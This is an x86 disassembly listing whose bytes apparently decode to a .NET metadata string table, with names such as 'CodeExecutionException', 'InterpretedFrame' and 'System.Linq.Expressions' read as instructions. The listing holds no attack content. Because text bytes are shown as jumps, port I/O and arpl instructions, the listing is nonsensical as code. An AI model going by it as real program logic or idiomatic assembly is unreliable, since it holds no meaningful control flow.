  407e2a:	jae    0x407e91
  407e2c:	push   esp
  407e2d:	jns    0x407e9f
  407e2f:	gs jae 0x407e32
  407e32:	inc    edi
  407e33:	gs je  0x407e86
  407e36:	popa   
  407e37:	jb     0x407e9a
  407e39:	ins    DWORD PTR es:[edi],dx
  407e3a:	gs je  0x407ea2
  407e3d:	jb     0x407eb2
  407e3f:	add    BYTE PTR [edi+0x65],ah
  407e42:	je     0x407ea3
  407e44:	push   eax
  407e45:	popa   
  407e46:	jb     0x407ea9
  407e48:	ins    DWORD PTR es:[edi],dx
  407e49:	gs je  0x407eb1
  407e4c:	jb     0x407ea2
  407e4e:	jns    0x407ec0
  407e50:	add    BYTE PTR gs:[edi+0x65],ah
  407e54:	je     0x407eb5
  407e56:	dec    ecx
  407e57:	jae    0x407e9b
  407e59:	jns    0x407ead
  407e5b:	data16 add BYTE PTR gs:[edi+0x65],al
  407e60:	je     0x407ea7
  407e62:	ins    BYTE PTR es:[edi],dx
  407e63:	gs ins DWORD PTR es:[edi],dx
  407e65:	outs   dx,BYTE PTR gs:[esi]
  407e67:	je     0x407ebd
  407e69:	jns    0x407edb
  407e6b:	add    BYTE PTR gs:[ebx+0x6f],al
  407e6f:	fs gs push ebx
  407e72:	je     0x407ed5
  407e74:	je     0x407edb
  407e76:	ins    DWORD PTR es:[edi],dx
  407e77:	outs   dx,BYTE PTR gs:[esi]
  407e79:	je     0x407ebe
  407e7b:	outs   dx,DWORD PTR ds:[esi]
  407e7c:	ins    BYTE PTR es:[edi],dx
  407e7d:	ins    BYTE PTR es:[edi],dx
  407e7e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407e83:	outs   dx,BYTE PTR ds:[esi]
  407e84:	add    BYTE PTR [edi+0x65],ah
  407e87:	je     0x407ee8
  407e89:	push   ebx
  407e8a:	je     0x407eed
  407e8c:	je     0x407ef3
  407e8e:	ins    DWORD PTR es:[edi],dx
  407e8f:	outs   dx,BYTE PTR gs:[esi]
  407e91:	je     0x407f06
  407e93:	add    BYTE PTR [ebx+0x6f],al
  407e96:	fs gs push esp
  407e99:	push   0x65527369
  407e9e:	data16 gs jb 0x407f07
  407ea2:	outs   dx,BYTE PTR ds:[esi]
  407ea3:	arpl   WORD PTR [ebp+0x45],sp
  407ea6:	js     0x407f18
  407ea8:	jb     0x407f0f
  407eaa:	jae    0x407f1f
  407eac:	imul   ebp,DWORD PTR [edi+0x6e],0x646f4300
  407eb3:	gs push eax
  407eb5:	jb     0x407f26
  407eb7:	jo     0x407f1e
  407eb9:	jb     0x407f2f
  407ebb:	jns    0x407f0f
  407ebd:	gs data16 gs jb 0x407f27
  407ec2:	outs   dx,BYTE PTR ds:[esi]
  407ec3:	arpl   WORD PTR [ebp+0x45],sp
  407ec6:	js     0x407f38
  407ec8:	jb     0x407f2f
  407eca:	jae    0x407f3f
  407ecc:	imul   ebp,DWORD PTR [edi+0x6e],0x646f4300
  407ed3:	gs push eax
  407ed5:	jb     0x407f40
  407ed7:	ins    DWORD PTR es:[edi],dx
  407ed8:	imul   esi,DWORD PTR [ecx+ebp*2+0x76],0x70784565
  407ee0:	jb     0x407f47
  407ee2:	jae    0x407f57
  407ee4:	imul   ebp,DWORD PTR [edi+0x6e],0x646f4300
  407eeb:	gs dec ecx
  407eed:	outs   dx,BYTE PTR ds:[esi]
  407eee:	fs gs js 0x407f57
  407ef2:	jb     0x407f39
  407ef4:	js     0x407f66
  407ef6:	jb     0x407f5d
  407ef8:	jae    0x407f6d
  407efa:	imul   ebp,DWORD PTR [edi+0x6e],0x646f4300
  407f01:	gs inc ebx
  407f03:	popa   
  407f04:	jae    0x407f7a
  407f06:	inc    ebp
  407f07:	js     0x407f79
  407f09:	jb     0x407f70
  407f0b:	jae    0x407f80
  407f0d:	imul   ebp,DWORD PTR [edi+0x6e],0x646f4300
  407f14:	gs inc ecx
  407f16:	jae    0x407f8b
  407f18:	imul   esp,DWORD PTR [edi+0x6e],0x74617453
  407f1f:	gs ins DWORD PTR es:[edi],dx
  407f21:	outs   dx,BYTE PTR gs:[esi]
  407f23:	je     0x407f25
  407f25:	inc    ebx
  407f26:	outs   dx,DWORD PTR ds:[esi]
  407f27:	fs gs push esp
  407f2a:	jns    0x407f9c
  407f2c:	gs inc esp
  407f2e:	arpl   WORD PTR gs:[ecx+eiz*2+0x72],bp
  407f33:	popa   
  407f34:	je     0x407f9f
  407f36:	outs   dx,DWORD PTR ds:[esi]
  407f37:	outs   dx,BYTE PTR ds:[esi]
  407f38:	inc    ebx
  407f39:	outs   dx,DWORD PTR ds:[esi]
  407f3a:	ins    BYTE PTR es:[edi],dx
  407f3b:	ins    BYTE PTR es:[edi],dx
  407f3c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407f41:	outs   dx,BYTE PTR ds:[esi]
  407f42:	add    BYTE PTR [edi+0x65],ah
  407f45:	je     0x407fa6
  407f47:	push   esp
  407f48:	jns    0x407fba
  407f4a:	gs jae 0x407f4d
  407f4d:	addr16 gs je 0x407fb0
  407f51:	push   edx
  407f52:	gs je  0x407fca
  407f55:	jb     0x407fc5
  407f57:	push   eax
  407f58:	popa   
  407f59:	jb     0x407fbc
  407f5b:	ins    DWORD PTR es:[edi],dx
  407f5c:	gs je  0x407fc4
  407f5f:	jb     0x407f61
  407f61:	push   esi
  407f62:	outs   dx,DWORD PTR ds:[esi]
  407f63:	imul   esp,DWORD PTR [eax+eax*1+0x6f],0x6e495f70
  407f6b:	gs jno 0x407fe3
  407f6e:	popa   
  407f6f:	ins    BYTE PTR es:[edi],dx
  407f70:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x65646f43
  407f78:	push   eax
  407f79:	popa   
  407f7a:	jb     0x407fdd
  407f7c:	ins    DWORD PTR es:[edi],dx
  407f7d:	gs je  0x407fe5
  407f80:	jb     0x407fc6
  407f82:	arpl   WORD PTR gs:[ecx+eiz*2+0x72],bp
  407f87:	popa   
  407f88:	je     0x407ff3
  407f8a:	outs   dx,DWORD PTR ds:[esi]
  407f8b:	outs   dx,BYTE PTR ds:[esi]
  407f8c:	inc    ebp
  407f8d:	js     0x407fff
  407f8f:	jb     0x407ff6
  407f91:	jae    0x408006
  407f93:	imul   ebp,DWORD PTR [edi+0x6e],0x6c6c6f43
  407f9a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407f9f:	outs   dx,BYTE PTR ds:[esi]
  407fa0:	add    BYTE PTR [edi+0x65],ah
  407fa3:	je     0x408004
  407fa5:	push   eax
  407fa6:	popa   
  407fa7:	jb     0x40800a
  407fa9:	ins    DWORD PTR es:[edi],dx
  407faa:	gs je  0x408012
  407fad:	jb     0x408022
  407faf:	add    BYTE PTR [ebp+0x76],al
  407fb2:	outs   dx,BYTE PTR gs:[esi]
  407fb4:	je     0x407ff7
  407fb6:	jb     0x40801f
  407fb8:	jae    0x407fba
  407fba:	inc    ebx
  407fbb:	outs   dx,DWORD PTR ds:[esi]
  407fbc:	fs gs push eax
  407fbf:	popa   
  407fc0:	jb     0x408023
  407fc2:	ins    DWORD PTR es:[edi],dx
  407fc3:	gs je  0x40802b
  407fc6:	jb     0x40800c
  407fc8:	arpl   WORD PTR gs:[ecx+eiz*2+0x72],bp
  407fcd:	popa   
  407fce:	je     0x408039
  407fd0:	outs   dx,DWORD PTR ds:[esi]
  407fd1:	outs   dx,BYTE PTR ds:[esi]
  407fd2:	inc    ebp
  407fd3:	js     0x408045
  407fd5:	jb     0x40803c
  407fd7:	jae    0x40804c
  407fd9:	imul   ebp,DWORD PTR [edi+0x6e],0x646f4300
  407fe0:	gs inc edx
  407fe2:	popa   
  407fe3:	jae    0x40804a
  407fe5:	push   edx
  407fe6:	gs data16 gs jb 0x408050
  407feb:	outs   dx,BYTE PTR ds:[esi]
  407fec:	arpl   WORD PTR [ebp+0x45],sp
  407fef:	js     0x408061
  407ff1:	jb     0x408058
  407ff3:	jae    0x408068
  407ff5:	imul   ebp,DWORD PTR [edi+0x6e],0x646f4300
  407ffc:	gs push esp
  407ffe:	jns    0x408070
  408000:	gs push edx
  408002:	gs data16 gs jb 0x40806c
  408007:	outs   dx,BYTE PTR ds:[esi]
  408008:	arpl   WORD PTR [ebp+0x0],sp
  40800b:	jae    0x408072
  40800d:	je     0x40806e
  40800f:	push   esp
  408010:	jns    0x408082
  408012:	add    BYTE PTR gs:[ebx+0x6f],al
  408016:	fs gs inc ecx
  408019:	je     0x40808f
  40801b:	jb     0x408086
  40801d:	bound  esi,QWORD PTR [ebp+0x74]
  408020:	gs inc esp
  408022:	arpl   WORD PTR gs:[ecx+eiz*2+0x72],bp
  408027:	popa   
  408028:	je     0x408093
  40802a:	outs   dx,DWORD PTR ds:[esi]
  40802b:	outs   dx,BYTE PTR ds:[esi]
  40802c:	inc    ebx
  40802d:	outs   dx,DWORD PTR ds:[esi]
  40802e:	ins    BYTE PTR es:[edi],dx
  40802f:	ins    BYTE PTR es:[edi],dx
  408030:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408035:	outs   dx,BYTE PTR ds:[esi]
  408036:	add    BYTE PTR [edi+0x65],ah
  408039:	je     0x40809a
  40803b:	inc    ebx
  40803c:	jne    0x4080b1
  40803e:	je     0x4080af
  408040:	ins    DWORD PTR es:[edi],dx
  408041:	inc    ecx
  408042:	je     0x4080b8
  408044:	jb     0x4080af
  408046:	bound  esi,QWORD PTR [ebp+0x74]
  408049:	gs jae 0x40804c
  40804c:	inc    edx
  40804d:	jb     0x4080be
  40804f:	ja     0x4080c4
  408051:	popa   
  408052:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  408056:	je     0x4080cc
  408058:	jb     0x4080c3
  40805a:	bound  esi,QWORD PTR [ebp+0x74]
  40805d:	add    BYTE PTR gs:[ebx+0x6f],al
  408061:	fs gs inc ecx
  408064:	je     0x4080da
  408066:	jb     0x4080d1
  408068:	bound  esi,QWORD PTR [ebp+0x74]
  40806b:	gs inc ecx
  40806d:	jb     0x4080d6
  40806f:	jne    0x4080de
  408071:	outs   dx,BYTE PTR gs:[esi]
  408073:	je     0x408075
  408075:	inc    edx
  408076:	outs   dx,DWORD PTR ds:[esi]
  408077:	outs   dx,DWORD PTR ds:[esi]
  408078:	ins    BYTE PTR es:[edi],dx
  408079:	gs popa 
  40807b:	outs   dx,BYTE PTR ds:[esi]
  40807c:	add    BYTE PTR [ebx+0x6f],al
  40807f:	fs gs inc ecx
  408082:	je     0x4080f8
  408084:	jb     0x4080ef
  408086:	bound  esi,QWORD PTR [ebp+0x74]
  408089:	gs inc esp
  40808b:	arpl   WORD PTR gs:[ecx+eiz*2+0x72],bp
  408090:	popa   
  408091:	je     0x4080fc
  408093:	outs   dx,DWORD PTR ds:[esi]
  408094:	outs   dx,BYTE PTR ds:[esi]
  408095:	add    BYTE PTR [ebp+eiz*2+0x73],al
  408099:	imul   esp,DWORD PTR [edi+0x6e],0x65537265
  4080a0:	jb     0x40810b
  4080a2:	popa   
  4080a3:	ins    BYTE PTR es:[edi],dx
  4080a4:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  4080ab:	push   esi
  4080ac:	imul   esi,DWORD PTR [ebx+0x69],0x696c6962
  4080b3:	je     0x40812e
  4080b5:	add    BYTE PTR [ebx+0x6f],al
  4080b8:	fs gs push esp
  4080bb:	jns    0x40812d
  4080bd:	gs push edx
  4080bf:	gs data16 gs jb 0x408129
  4080c4:	outs   dx,BYTE PTR ds:[esi]
  4080c5:	arpl   WORD PTR [ebp+0x45],sp
  4080c8:	js     0x40813a
  4080ca:	jb     0x408131
  4080cc:	jae    0x408141
  4080ce:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  4080d5:	pop    edi
  4080d6:	inc    edi
  4080d7:	gs je  0x40812d
  4080da:	je     0x40813d
  4080dc:	je     0x408143
  4080de:	ins    DWORD PTR es:[edi],dx
  4080df:	outs   dx,BYTE PTR gs:[esi]
  4080e1:	je     0x408156
  4080e3:	add    BYTE PTR [ebx+0x6f],al
  4080e6:	fs gs dec ebp
  4080e9:	gs je  0x408154
  4080ec:	outs   dx,DWORD PTR ds:[esi]
  4080ed:	fs push edx
  4080ef:	gs je  0x408167
  4080f2:	jb     0x408162
  4080f4:	push   ebx
  4080f5:	je     0x408158
  4080f7:	je     0x40815e
  4080f9:	ins    DWORD PTR es:[edi],dx
  4080fa:	outs   dx,BYTE PTR gs:[esi]
  4080fc:	je     0x4080fe
  4080fe:	addr16 gs je 0x408161
  408102:	push   ebx
  408103:	gs je  0x408159
  408106:	je     0x408169
  408108:	je     0x40816f
  40810a:	ins    DWORD PTR es:[edi],dx
  40810b:	outs   dx,BYTE PTR gs:[esi]
  40810d:	je     0x408182
  40810f:	add    BYTE PTR [ecx+0x6e],cl
  408112:	jbe    0x408175
  408114:	ins    BYTE PTR es:[edi],dx
  408115:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x74617265
  40811d:	imul   ebp,DWORD PTR [edi+0x6e],0x65637845
  408124:	jo     0x40819a
  408126:	imul   ebp,DWORD PTR [edi+0x6e],0x646f4300
  40812d:	gs dec edi
  40812f:	bound  ebp,QWORD PTR [edx+0x65]
  408132:	arpl   WORD PTR [ebx+eax*2+0x72],si
  408136:	gs popa 
  408138:	je     0x40819f
  40813a:	inc    ebp
  40813b:	js     0x4081ad
  40813d:	jb     0x4081a4
  40813f:	jae    0x4081b4
  408141:	imul   ebp,DWORD PTR [edi+0x6e],0x646f4300
  408148:	gs push esp
  40814a:	push   0x45776f72
  40814f:	js     0x4081b4
  408151:	gs jo  0x4081c8
  408154:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  40815b:	gs ins DWORD PTR es:[edi],dx
  40815d:	outs   dx,BYTE PTR gs:[esi]
  40815f:	je     0x408161
  408161:	addr16 gs je 0x4081c4
  408165:	inc    esp
  408166:	arpl   WORD PTR gs:[ecx+eiz*2+0x72],bp
  40816b:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  408172:	add    BYTE PTR [ebx+0x6f],al
  408175:	fs gs push esp
  408178:	jns    0x4081ea
  40817a:	gs dec edi
  40817c:	inc    bp
  40817e:	js     0x4081f0
  408180:	jb     0x4081e7
  408182:	jae    0x4081f7
  408184:	imul   ebp,DWORD PTR [edi+0x6e],0x646f4300
  40818b:	gs dec ebp
  40818d:	gs je  0x4081f8
  408190:	outs   dx,DWORD PTR ds:[esi]
  408191:	fs dec ecx
  408193:	outs   dx,BYTE PTR ds:[esi]
  408194:	jbe    0x408205
  408196:	imul   esp,DWORD PTR [ebp+0x45],0x78
  40819a:	jo     0x40820e
  40819c:	gs jae 0x408212
  40819f:	imul   ebp,DWORD PTR [edi+0x6e],0x74657300
  4081a6:	pop    edi
  4081a7:	dec    ecx
  4081a8:	outs   dx,BYTE PTR ds:[esi]
  4081a9:	imul   esi,DWORD PTR [ebp+eax*2+0x78],0x73657270
  4081b1:	jae    0x40821c
  4081b3:	outs   dx,DWORD PTR ds:[esi]
  4081b4:	outs   dx,BYTE PTR ds:[esi]
  4081b5:	add    BYTE PTR [esi+0x61],dl
  4081b8:	ins    BYTE PTR es:[edi],dx
  4081b9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x4f6e6f69
  4081c1:	jo     0x408237
  4081c3:	imul   ebp,DWORD PTR [edi+0x6e],0x646f4300
  4081ca:	gs inc esi
  4081cc:	imul   esp,DWORD PTR [ebp+0x6c],0x66655264
  4081d3:	gs jb  0x40823b
  4081d6:	outs   dx,BYTE PTR ds:[esi]
  4081d7:	arpl   WORD PTR [ebp+0x45],sp
  4081da:	js     0x40824c
  4081dc:	jb     0x408243
  4081de:	jae    0x408253
  4081e0:	imul   ebp,DWORD PTR [edi+0x6e],0x646f4300
  4081e7:	gs push eax
  4081e9:	jb     0x40825a
  4081eb:	jo     0x408252
  4081ed:	jb     0x408263
  4081ef:	jns    0x408244
  4081f1:	gs je  0x40824a
  4081f4:	popa   
  4081f5:	ins    BYTE PTR es:[edi],dx
  4081f6:	jne    0x40825d
  4081f8:	push   edx
  4081f9:	gs data16 gs jb 0x408263
  4081fe:	outs   dx,BYTE PTR ds:[esi]
  4081ff:	arpl   WORD PTR [ebp+0x45],sp
  408202:	js     0x408274
  408204:	jb     0x40826b
  408206:	jae    0x40827b
  408208:	imul   ebp,DWORD PTR [edi+0x6e],0x74654700
  40820f:	inc    ebp
  408210:	jbe    0x408277
  408212:	outs   dx,BYTE PTR ds:[esi]
  408213:	je     0x408288
  408215:	add    BYTE PTR [edi+0x65],ah
  408218:	je     0x408279
  40821a:	inc    ebp
  40821b:	jbe    0x408282
  40821d:	outs   dx,BYTE PTR ds:[esi]
  40821e:	je     0x408268
  408220:	popa   
  408221:	outs   dx,BYTE PTR ds:[esi]
  408222:	fs ins BYTE PTR es:[edi],dx
  408224:	gs jb  0x40827b
  408227:	jns    0x408299
  408229:	add    BYTE PTR gs:[edi+0x65],ah
  40822d:	je     0x40828e
  40822f:	dec    ecx
  408230:	jae    0x408279
  408232:	outs   dx,BYTE PTR gs:[esi]
  408234:	gs jb  0x4082a0
  408237:	arpl   WORD PTR [ecx+edi*2+0x70],dx
  40823b:	add    BYTE PTR gs:[edi+0x65],al
  40823f:	je     0x408288
  408241:	outs   dx,BYTE PTR gs:[esi]
  408243:	gs jb  0x4082af
  408246:	arpl   WORD PTR [ecx+edi*2+0x70],dx
  40824a:	gs inc esp
  40824c:	imul   bp,WORD PTR gs:[esi+0x69],0x6974
  408253:	outs   dx,DWORD PTR ds:[esi]
  408254:	outs   dx,BYTE PTR ds:[esi]
  408255:	add    BYTE PTR [ebp+0x76],al
  408258:	outs   dx,BYTE PTR gs:[esi]
  40825a:	je     0x4082a4
  40825c:	popa   
  40825d:	outs   dx,BYTE PTR ds:[esi]
  40825e:	fs ins BYTE PTR es:[edi],dx
  408260:	gs jb  0x4082c3
  408263:	xor    DWORD PTR [eax],eax
  408265:	inc    edi
  408266:	gs je  0x4082b0
  408269:	outs   dx,BYTE PTR gs:[esi]
  40826b:	gs jb  0x4082d7
  40826e:	arpl   WORD PTR [ecx+0x72],ax
  408271:	addr16 jne 0x4082e1
  408274:	outs   dx,BYTE PTR gs:[esi]
  408276:	je     0x4082eb
  408278:	add    BYTE PTR [ebp+0x78],al
  40827b:	je     0x4082e2
  40827d:	jb     0x4082ed
  40827f:	popa   
  408280:	ins    BYTE PTR es:[edi],dx
  408281:	inc    esp
  408282:	popa   
  408283:	je     0x4082e6
  408285:	inc    ebp
  408286:	jbe    0x4082ed
  408288:	outs   dx,BYTE PTR ds:[esi]
  408289:	je     0x4082cc
  40828b:	jb     0x4082f4
  40828d:	jae    0x40828f
  40828f:	dec    ecx
  408290:	jae    0x4082d3
  408292:	jae    0x408307
  408294:	imul   esp,DWORD PTR [edi+0x6e],0x656c6261
  40829b:	inc    esi
  40829c:	jb     0x40830d
  40829e:	ins    DWORD PTR es:[edi],dx
  40829f:	add    BYTE PTR [eax+0x61],cl
  4082a2:	outs   dx,BYTE PTR ds:[esi]
  4082a3:	fs ins BYTE PTR es:[edi],dx
  4082a5:	gs inc ebp
  4082a7:	js     0x40831d
  4082a9:	gs jb  0x40831a
  4082ac:	popa   
  4082ad:	ins    BYTE PTR es:[edi],dx
  4082ae:	inc    ebp
  4082af:	jbe    0x408316
  4082b1:	outs   dx,BYTE PTR ds:[esi]
  4082b2:	je     0x4082f5
  4082b4:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4082b8:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x756e4549
  4082c0:	ins    DWORD PTR es:[edi],dx
  4082c1:	gs jb  0x408325
  4082c4:	je     0x408335
  4082c6:	jb     0x408328
  4082c8:	xor    DWORD PTR [eax],eax
  4082ca:	addr16 gs je 0x40832d
  4082ce:	push   eax
  4082cf:	jb     0x408340
  4082d1:	jo     0x408338
  4082d3:	jb     0x408349
  4082d5:	jns    0x40832b
  4082d7:	jns    0x408349
  4082d9:	add    BYTE PTR gs:[ebx+0x79],dl
  4082dd:	jae    0x408353
  4082df:	gs ins DWORD PTR es:[edi],dx
  4082e1:	cs inc ebx
  4082e3:	outs   dx,DWORD PTR ds:[esi]
  4082e4:	ins    BYTE PTR es:[edi],dx
  4082e5:	ins    BYTE PTR es:[edi],dx
  4082e6:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4082eb:	outs   dx,BYTE PTR ds:[esi]
  4082ec:	jae    0x4082ee
  4082ee:	dec    ecx
  4082ef:	inc    ebp
  4082f0:	outs   dx,BYTE PTR ds:[esi]
  4082f1:	jne    0x408360
  4082f3:	gs jb  0x408357
  4082f6:	je     0x408367
  4082f8:	jb     0x4082fa
  4082fa:	addr16 gs je 0x40835d
  4082fe:	inc    esi
  4082ff:	imul   esp,DWORD PTR [ebp+0x6c],0x70795464
  408306:	add    BYTE PTR gs:[ebx+0x6f],al
  40830a:	fs gs push esi
  40830d:	popa   
  40830e:	jb     0x408379
  408310:	popa   
  408311:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
  408315:	gs data16 gs jb 0x40837f
  40831a:	outs   dx,BYTE PTR ds:[esi]
  40831b:	arpl   WORD PTR [ebp+0x45],sp
  40831e:	js     0x408390
  408320:	jb     0x408387
  408322:	jae    0x408397
  408324:	imul   ebp,DWORD PTR [edi+0x6e],0x646f4300
  40832b:	gs push esi
  40832d:	popa   
  40832e:	jb     0x408399
  408330:	popa   
  408331:	bound  ebp,QWORD PTR [ebp+eiz*2+0x44]
  408335:	arpl   WORD PTR gs:[ecx+eiz*2+0x72],bp
  40833a:	popa   
  40833b:	je     0x4083a6
  40833d:	outs   dx,DWORD PTR ds:[esi]
  40833e:	outs   dx,BYTE PTR ds:[esi]
  40833f:	push   ebx
  408340:	je     0x4083a3
  408342:	je     0x4083a9
  408344:	ins    DWORD PTR es:[edi],dx
  408345:	outs   dx,BYTE PTR gs:[esi]
  408347:	je     0x408349
  408349:	dec    ecx
  40834a:	outs   dx,BYTE PTR ds:[esi]
  40834b:	jae    0x4083b2
  40834d:	jb     0x4083c3
  40834f:	add    BYTE PTR [esi+ecx*2],bh
  408352:	outs   dx,DWORD PTR ds:[esi]
  408353:	outs   dx,BYTE PTR ds:[esi]
  408354:	push   edi
  408355:	outs   dx,DWORD PTR ds:[esi]
  408356:	jb     0x4083c3
  408358:	data16 ins BYTE PTR es:[edi],dx
  40835a:	outs   dx,DWORD PTR ds:[esi]
  40835b:	ja     0x4083aa
  40835d:	gs jae 0x4083d3
  408360:	popa   
  408361:	addr16 gs push eax
  408364:	jb     0x4083d5
  408366:	jo     0x4083cd
  408368:	jb     0x4083de
  40836a:	imul   esp,DWORD PTR [ebp+0x73],0x5f5f643e
  408371:	xor    BYTE PTR [eax],al
  408373:	dec    ecx
  408374:	inc    ebp
  408375:	outs   dx,BYTE PTR ds:[esi]
  408376:	jne    0x4083e5
  408378:	gs jb  0x4083dc
  40837b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  40837f:	push   ebx
  408380:	jns    0x4083f5
  408382:	je     0x4083e9
  408384:	ins    DWORD PTR es:[edi],dx
  408385:	cs inc ebx
  408387:	outs   dx,DWORD PTR ds:[esi]
  408388:	ins    BYTE PTR es:[edi],dx
  408389:	ins    BYTE PTR es:[edi],dx
  40838a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40838f:	outs   dx,BYTE PTR ds:[esi]
  408390:	jae    0x4083c0
  408392:	inc    edi
  408393:	outs   dx,BYTE PTR gs:[esi]
  408395:	gs jb  0x408401
  408398:	arpl   WORD PTR [esi],bp
  40839a:	dec    ecx
  40839b:	inc    ebp
  40839c:	outs   dx,BYTE PTR ds:[esi]
  40839d:	jne    0x40840c
  40839f:	gs jb  0x408403
  4083a2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x3c]
  4083a6:	push   ebx
  4083a7:	jns    0x40841c
  4083a9:	je     0x408410
  4083ab:	ins    DWORD PTR es:[edi],dx
  4083ac:	cs push edx
  4083ae:	gs data16 ins BYTE PTR es:[edi],dx
  4083b1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4083b6:	outs   dx,BYTE PTR ds:[esi]
  4083b7:	cs push eax
  4083b9:	jb     0x40842a
  4083bb:	jo     0x408422
  4083bd:	jb     0x408433
  4083bf:	jns    0x40840a
  4083c1:	outs   dx,BYTE PTR ds:[esi]
  4083c2:	outs   dx,WORD PTR ds:[esi]
  4083c4:	ds cs inc edi
  4083c7:	gs je  0x40840f
  4083ca:	outs   dx,BYTE PTR ds:[esi]
  4083cb:	jne    0x40843a
  4083cd:	gs jb  0x408431
  4083d0:	je     0x408441
  4083d2:	jb     0x4083d4
  4083d4:	push   ebx
  4083d5:	jns    0x40844a
  4083d7:	je     0x40843e
  4083d9:	ins    DWORD PTR es:[edi],dx
  4083da:	cs inc ebx
  4083dc:	outs   dx,DWORD PTR ds:[esi]
  4083dd:	ins    BYTE PTR es:[edi],dx
  4083de:	ins    BYTE PTR es:[edi],dx
  4083df:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4083e4:	outs   dx,BYTE PTR ds:[esi]
  4083e5:	jae    0x408415
  4083e7:	dec    ecx
  4083e8:	inc    ebp
  4083e9:	outs   dx,BYTE PTR ds:[esi]
  4083ea:	jne    0x408459
  4083ec:	gs jb  0x408450
  4083ef:	bound  ebp,QWORD PTR [ebp+eiz*2+0x2e]
  4083f3:	inc    edi
  4083f4:	gs je  0x40843c
  4083f7:	outs   dx,BYTE PTR ds:[esi]
  4083f8:	jne    0x408467
  4083fa:	gs jb  0x40845e
  4083fd:	je     0x40846e
  4083ff:	jb     0x408401
  408401:	cmp    al,0x3e
  408403:	xor    bl,BYTE PTR [edi+0x5f]
  408406:	arpl   WORD PTR [ebp+0x72],si
  408409:	jb     0x408470
  40840b:	outs   dx,BYTE PTR ds:[esi]
  40840c:	je     0x40840e
  40840e:	push   ebx
  40840f:	jns    0x408484
  408411:	je     0x408478
  408413:	ins    DWORD PTR es:[edi],dx
  408414:	cs inc ebx
  408416:	outs   dx,DWORD PTR ds:[esi]
  408417:	ins    BYTE PTR es:[edi],dx
  408418:	ins    BYTE PTR es:[edi],dx
  408419:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40841e:	outs   dx,BYTE PTR ds:[esi]
  40841f:	jae    0x40844f
  408421:	inc    edi
  408422:	outs   dx,BYTE PTR gs:[esi]
  408424:	gs jb  0x408490
  408427:	arpl   WORD PTR [esi],bp
  408429:	dec    ecx
  40842a:	inc    ebp
  40842b:	outs   dx,BYTE PTR ds:[esi]
  40842c:	jne    0x40849b
  40842e:	gs jb  0x408492
  408431:	je     0x4084a2
  408433:	jb     0x408471
  408435:	push   ebx
  408436:	jns    0x4084ab
  408438:	je     0x40849f
  40843a:	ins    DWORD PTR es:[edi],dx
  40843b:	cs push edx
  40843d:	gs data16 ins BYTE PTR es:[edi],dx
  408440:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408445:	outs   dx,BYTE PTR ds:[esi]
  408446:	cs push eax
  408448:	jb     0x4084b9
  40844a:	jo     0x4084b1
  40844c:	jb     0x4084c2
  40844e:	jns    0x408499
  408450:	outs   dx,BYTE PTR ds:[esi]
  408451:	outs   dx,WORD PTR ds:[esi]
  408453:	ds cs addr16 gs je 0x4084b8
  408459:	inc    ebx
  40845a:	jne    0x4084ce
  40845c:	jb     0x4084c3
  40845e:	outs   dx,BYTE PTR ds:[esi]
  40845f:	je     0x408461
  408461:	push   ebx
  408462:	jns    0x4084d7
  408464:	je     0x4084cb
  408466:	ins    DWORD PTR es:[edi],dx
  408467:	cs inc ebx
  408469:	outs   dx,DWORD PTR ds:[esi]
  40846a:	ins    BYTE PTR es:[edi],dx
  40846b:	ins    BYTE PTR es:[edi],dx
  40846c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408471:	outs   dx,BYTE PTR ds:[esi]
  408472:	jae    0x4084a2
  408474:	dec    ecx
  408475:	inc    ebp
  408476:	outs   dx,BYTE PTR ds:[esi]
  408477:	jne    0x4084e6
  408479:	gs jb  0x4084dd
  40847c:	je     0x4084ed
  40847e:	jb     0x4084ae
  408480:	push   edx
  408481:	gs jae 0x4084e9
  408484:	je     0x408486
  408486:	push   edx
  408487:	gs jae 0x4084ef
  40848a:	je     0x40848c
  40848c:	push   ebx
  40848d:	jns    0x408502
  40848f:	je     0x4084f6
  408491:	ins    DWORD PTR es:[edi],dx
  408492:	cs dec ecx
  408494:	inc    esp
  408495:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  40849c:	ins    BYTE PTR es:[edi],dx
  40849d:	gs cs inc esp
  4084a0:	imul   esi,DWORD PTR [ebx+0x70],0x65736f
  4084a7:	cmp    al,0x3e
  4084a9:	xor    DWORD PTR [edi+0x5f],ebx
  4084ac:	jae    0x408522
  4084ae:	popa   
  4084af:	je     0x408516
  4084b1:	add    BYTE PTR [esi+edi*1],bh
  4084b4:	ins    BYTE PTR es:[edi],dx
  4084b5:	pop    edi
  4084b6:	pop    edi
  4084b7:	imul   ebp,DWORD PTR [esi+0x69],0x6c616974
  4084be:	push   esp
  4084bf:	push   0x64616572
  4084c4:	dec    ecx
  4084c5:	add    BYTE PTR fs:[ebx+0x79],dl
  4084c9:	jae    0x40853f
  4084cb:	gs ins DWORD PTR es:[edi],dx
  4084cd:	cs inc ebx
  4084cf:	outs   dx,DWORD PTR ds:[esi]
  4084d0:	ins    BYTE PTR es:[edi],dx
  4084d1:	ins    BYTE PTR es:[edi],dx
  4084d2:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4084d7:	outs   dx,BYTE PTR ds:[esi]
  4084d8:	jae    0x408508
  4084da:	dec    ecx
